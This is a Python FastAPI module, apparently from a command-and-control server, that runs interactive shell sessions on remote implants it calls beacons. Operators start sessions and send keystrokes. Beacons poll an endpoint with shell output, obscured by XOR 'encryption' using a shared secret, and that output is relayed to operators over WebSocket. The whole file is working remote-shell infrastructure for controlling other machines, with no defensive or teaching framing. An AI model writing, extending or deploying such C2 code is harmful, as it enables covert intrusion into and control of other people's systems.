"""
PTY session management.
Operator creates sessions, beacon streams I/O through /api/beacon/pty_tick.
"""
from fastapi import APIRouter, Depends, HTTPException, Header, Request
from pydantic import BaseModel
from sqlalchemy.orm import Session
from typing import Optional
import uuid, base64, json as _json
from database import get_db, Task
from auth import require_auth, User
from websocket_manager import manager as ws_manager
import config


def _decrypt_body(raw: bytes) -> dict:
    """Transparently decrypt XOR-encrypted beacon body (enc:1 format)."""
    try:
        obj = _json.loads(raw)
        if isinstance(obj, dict) and obj.get("enc") == 1:
            nonce = obj["nonce"]
            data  = bytes.fromhex(obj["data"])
            key   = (config.AGENT_SECRET + nonce).encode()
            plain = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            return _json.loads(plain)
        return obj
    except Exception:
        return _json.loads(raw)

router = APIRouter(tags=["pty"])

# ── In-memory session store ───────────────────────────────────────────────────

class _PTYSess:
    def __init__(self, sid, agent_id):
        self.id        = sid
        self.agent_id  = agent_id
        self.active    = True
        self.input_buf = b""   # pending bytes to write to PTY stdin

_sessions: dict[str, _PTYSess] = {}


# ── Operator endpoints ────────────────────────────────────────────────────────

@router.post("/api/pty/{agent_id}/start")
def start_pty(agent_id: str, db: Session = Depends(get_db), _: User = Depends(require_auth)):
    sid  = str(uuid.uuid4())
    _sessions[sid] = _PTYSess(sid, agent_id)
    task = Task(agent_id=agent_id, command=f"__pty__:{sid}")
    db.add(task); db.commit(); db.refresh(task)
    return {"session_id": sid, "task_id": task.id}


class PTYInputReq(BaseModel):
    data: str   # base64-encoded bytes


@router.post("/api/pty/{agent_id}/{session_id}/input")
def pty_input(agent_id: str, session_id: str, req: PTYInputReq, _: User = Depends(require_auth)):
    sess = _sessions.get(session_id)
    if not sess or sess.agent_id != agent_id:
        raise HTTPException(404, "PTY session not found")
    sess.input_buf += base64.b64decode(req.data)
    return {"ok": True}


@router.delete("/api/pty/{agent_id}/{session_id}")
def kill_pty(agent_id: str, session_id: str, _: User = Depends(require_auth)):
    sess = _sessions.get(session_id)
    if sess:
        sess.active = False
    return {"ok": True}


@router.get("/api/pty/{agent_id}/sessions")
def list_sessions(agent_id: str, _: User = Depends(require_auth)):
    return [
        {"session_id": s.id, "active": s.active}
        for s in _sessions.values()
        if s.agent_id == agent_id and s.active
    ]


# ── Beacon endpoint ───────────────────────────────────────────────────────────

class PTYTick(BaseModel):
    session_id: str
    data: str   # base64 stdout/stderr from PTY (may be "")


def _verify_beacon(x_agent_secret: Optional[str] = Header(None)):
    if x_agent_secret != config.AGENT_SECRET:
        raise HTTPException(403, "Invalid agent secret")


@router.post("/api/beacon/pty_tick")
async def pty_tick(request: Request, _: None = Depends(_verify_beacon)):
    try:
        req = PTYTick(**_decrypt_body(await request.body()))
    except Exception:
        raise HTTPException(422, "Invalid pty_tick body")
    sess = _sessions.get(req.session_id)
    if not sess:
        return {"active": False, "input": ""}

    # Push output to operator via WebSocket
    if req.data:
        await ws_manager.broadcast({
            "type": "pty_output",
            "session_id": req.session_id,
            "agent_id":   sess.agent_id,
            "data":       req.data,
        })

    # Flush pending input to beacon
    inp = ""
    if sess.input_buf:
        inp = base64.b64encode(sess.input_buf).decode()
        sess.input_buf = b""

    return {"active": sess.active, "input": inp}
